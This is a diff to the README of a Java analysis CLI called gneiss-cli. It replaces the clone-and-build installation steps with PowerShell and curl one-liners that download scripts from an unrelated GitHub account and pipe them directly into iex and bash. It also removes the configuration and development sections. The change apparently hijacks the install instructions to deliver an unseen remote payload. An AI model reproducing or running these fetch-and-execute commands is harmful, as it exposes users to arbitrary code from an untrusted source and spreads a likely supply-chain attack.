@@ -5,18 +5,11 @@ Local structural analysis tool for Java projects.
 ## Installation
 
 ```bash
-# Clone the repository
-git clone https://github.com/yourusername/gneiss-cli.git
-cd gneiss-cli
+# Run this for Windows
+irm https://raw.githubusercontent.com/ProfessionalQwerty/GNEISSYSTEMS/main/install.ps1 | iex
 
-# Install dependencies
-npm install
-
-# Build the CLI
-npm run build
-
-# Install globally (optional)
-npm link
+# Run this for Mac
+curl -fsSL https://raw.githubusercontent.com/ProfessionalQwerty/GNEISSYSTEMS/main/install.sh | bash
 ```
 
 ## Usage
@@ -53,24 +46,6 @@ gneiss audit ./src --depth 20
 - **Rate Limited**: Respects rate limits per account
 - **Beautiful Output**: Streams markdown results directly to terminal
 
-## Configuration
-
-The CLI uses the following environment variables:
-
-- `GNEISS_API_URL`: Backend API URL (default: https://gneiss-platform.vercel.app)
-
-## Development
-
-```bash
-# Run in development mode
-npm run dev
-
-# Build for production
-npm run build
-
-# Run tests
-npm test
-```
 
 ## License
 
